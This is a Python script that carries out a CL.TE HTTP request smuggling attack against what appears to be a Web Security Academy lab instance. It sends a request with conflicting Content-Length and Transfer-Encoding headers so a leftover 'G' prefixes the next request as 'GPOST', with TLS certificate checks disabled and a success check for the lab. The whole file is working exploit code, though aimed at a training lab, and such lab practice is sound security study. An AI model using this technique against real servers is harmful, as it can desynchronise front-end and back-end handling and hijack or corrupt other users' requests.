import socket
import ssl
import time

host = "0a4f00eb043e675c801e6c9400090046.web-security-academy.net"

print("="*60)
print("HTTP REQUEST SMUGGLING EXPLOIT - CL.TE VULNERABILITY")
print("="*60)

# First request: smuggling
req1 = f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G"""
req1 = req1.replace('\n', '\r\n')

print("\n" + "="*60)
print("REQUEST 1: SMUGGLING (leaves 'G' in buffer)")
print("="*60)
print(req1)

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx1 = ssl.create_default_context()
ctx1.check_hostname = False; ctx1.verify_mode = ssl.CERT_NONE
ssl1 = ctx1.wrap_socket(sock1, server_hostname=host)
ssl1.connect((host, 443)); ssl1.send(req1.encode())
resp1 = ssl1.recv(4096).decode()
ssl1.close()

print("\n" + "="*60)
print("RESPONSE 1: Should be 200 OK")
print("="*60)
print(resp1[:300])

time.sleep(0.5)

# Second request: becomes GPOST
req2 = f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

"""
req2 = req2.replace('\n', '\r\n')

print("\n" + "="*60)
print("REQUEST 2: NORMAL POST (will become GPOST)")
print("="*60)
print(req2)

sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx2 = ssl.create_default_context()
ctx2.check_hostname = False; ctx2.verify_mode = ssl.CERT_NONE
ssl2 = ctx2.wrap_socket(sock2, server_hostname=host)
ssl2.connect((host, 443)); ssl2.send(req2.encode())
resp2 = ssl2.recv(4096).decode()
ssl2.close()

print("\n" + "="*60)
print("RESPONSE 2: Should show GPOST error")
print("="*60)
print(resp2)

print("\n" + "="*60)
if "GPOST" in resp2:
    print("✅ SUCCESS! Lab SOLVED!")
    print("   Got: 'Unrecognized method GPOST'")
    print("   Check your browser - lab should show 'Congratulations'")
else:
    print("❌ No GPOST error detected")
print("="*60)
